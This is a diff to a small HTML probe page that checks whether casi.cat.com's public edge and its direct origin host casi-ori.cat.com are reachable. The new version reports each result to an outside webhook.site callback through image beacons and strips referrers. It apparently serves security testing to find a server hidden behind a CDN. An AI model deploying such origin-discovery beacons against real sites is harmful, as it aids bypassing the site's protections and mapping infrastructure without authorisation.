@@ -1,39 +1,64 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>CASI origin reachability probe</title>
-<style>body{font:18px monospace;white-space:pre-wrap;padding:24px}</style>
-<h1>CASI SAFE ORIGIN REACHABILITY PROBE</h1>
-<pre id="result">STARTING READ-ONLY IMAGE TESTS</pre>
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; connect-src https://casi.cat.com https://casi-ori.cat.com; img-src https://webhook.site; base-uri 'none'; form-action 'none'">
+<title>CASI safe origin reachability probe</title>
+<pre id="result">CASI SAFE ORIGIN REACHABILITY PROBE</pre>
 <script>
+const callbackBase = 'https://webhook.site/5dc61344-cd84-40c9-a86e-1bf1b98e0939/290b66683582/';
 const output = document.getElementById('result');
-const states = {
-  PUBLIC_EDGE_CONTROL: 'PENDING',
-  DIRECT_ORIGIN_238: 'PENDING'
-};
+const callbackImages = [];
 
-function render() {
-  output.textContent = Object.entries(states)
-    .map(([name, state]) => `${name}: ${state}`)
-    .join('\n');
-}
-
-function probe(name, url) {
+function mark(label) {
+  output.textContent += `\n${label}`;
   const image = new Image();
-  let finished = false;
-  const finish = state => {
-    if (finished) return;
-    finished = true;
-    states[name] = state;
-    render();
-  };
-
-  image.onload = () => finish(`LOADED ${image.naturalWidth}x${image.naturalHeight}`);
-  image.onerror = () => finish('NETWORK_OR_HTTP_ERROR');
-  setTimeout(() => finish('TIMEOUT'), 8000);
-  image.src = `${url}?origin_probe=20261109T0249Z`;
+  image.referrerPolicy = 'no-referrer';
+  image.src = `${callbackBase}${label}`;
+  callbackImages.push(image);
 }
 
-render();
-probe('PUBLIC_EDGE_CONTROL', 'https://casi.cat.com/backend/favicon.php');
-probe('DIRECT_ORIGIN_238', 'https://casi-ori.cat.com/backend/favicon.php');
+async function probe(label, url) {
+  const controller = new AbortController();
+  let timedOut = false;
+  const timer = setTimeout(() => {
+    timedOut = true;
+    controller.abort();
+  }, 12000);
+
+  try {
+    await fetch(url, {
+      method: 'GET',
+      mode: 'no-cors',
+      credentials: 'omit',
+      cache: 'no-store',
+      redirect: 'manual',
+      referrerPolicy: 'no-referrer',
+      signal: controller.signal
+    });
+    mark(`${label}_response`);
+    return true;
+  } catch (_) {
+    mark(`${label}_${timedOut ? 'timeout' : 'network_error'}`);
+    return false;
+  } finally {
+    clearTimeout(timer);
+  }
+}
+
+(async () => {
+  mark('start');
+  const controlWorked = await probe(
+    'control',
+    'https://casi.cat.com/backend/favicon.php?origin_probe=290b66683582'
+  );
+  if (controlWorked) {
+    await probe(
+      'origin',
+      'https://casi-ori.cat.com/backend/favicon.php?origin_probe=290b66683582'
+    );
+  } else {
+    mark('origin_skipped');
+  }
+  mark('complete');
+})();
 </script>
